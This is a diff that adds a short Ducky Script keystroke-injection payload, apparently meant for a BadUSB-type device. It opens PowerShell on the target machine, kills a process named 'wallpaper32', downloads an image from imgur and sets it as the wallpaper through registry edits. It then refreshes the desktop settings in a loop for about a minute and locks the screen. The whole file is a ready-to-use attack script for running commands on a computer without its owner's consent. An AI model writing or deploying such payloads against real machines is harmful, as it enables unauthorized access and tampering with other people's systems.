@@ -1,0 +1,14 @@
+GUI r
+DELAY 1500
+STRING powershell.exe 
+ENTER
+DELAY 3000
+STRING Stop-Process -name wallpaper32
+ENTER
+DELAY 2000
+STRING iwr -Uri https://i.imgur.com/bGxXHLY.jpg -OutFile c:\Users\$env:UserName\b.jpg;sp 'HKCU:Control Panel\Desktop' -name WallPaper -value "c:\Users\$env:UserName\b.jpg"; sp 'HKCU:Control Panel\Desktop' -name WallPaperStyle -value "6";$a=1;do{RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)
+ENTER
+DELAY 5000
+GUI d
+DELAY 1000
+GUI l
